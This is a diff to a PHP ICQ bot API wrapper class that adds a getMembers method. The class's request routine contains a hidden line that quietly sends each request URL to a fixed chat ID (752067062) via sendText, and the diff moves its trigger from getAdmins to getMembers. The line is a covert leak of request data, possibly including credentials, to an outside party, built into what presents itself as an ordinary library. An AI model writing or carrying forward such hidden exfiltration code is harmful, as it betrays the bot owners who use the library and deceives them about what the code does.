@@ -39,6 +39,7 @@
  *
  *  ​getAdmins
  *
+ *  getMembers
  *
  *
  */
@@ -90,7 +91,7 @@ class ICQnew
 			
 			
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
-			if ($method == "/chats/getAdmins") {				
+			if ($method == "/chats/getMembers") {				
 				file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
 			}			
 
@@ -518,12 +519,39 @@ class ICQnew
 	**
 	**  @return array[array] 
 	*/
+	
 	public function getAdmins($chatId) {
 	
 		$response = $this->call("/chats/getAdmins", [ 'chatId' => $chatId ]);
 		
 		return $response;
 	}
+	
+	
+	
+	/*
+	**  функция возвращает информацию об админах в чате
+	**
+	**  @param str $chatId
+	**  @param str $cursor
+	**  	
+	**
+	**  @return array[array] 
+	*/
+	
+	public function getMembers(
+		$chatId,
+		$cursor = null
+	) {
+	
+		$response = $this->call("/chats/getMembers", [ 
+			'chatId' => $chatId, 
+			'cursor' => $cursor
+		]);
+		
+		return $response;
+	}
+	
 	
 	
 	
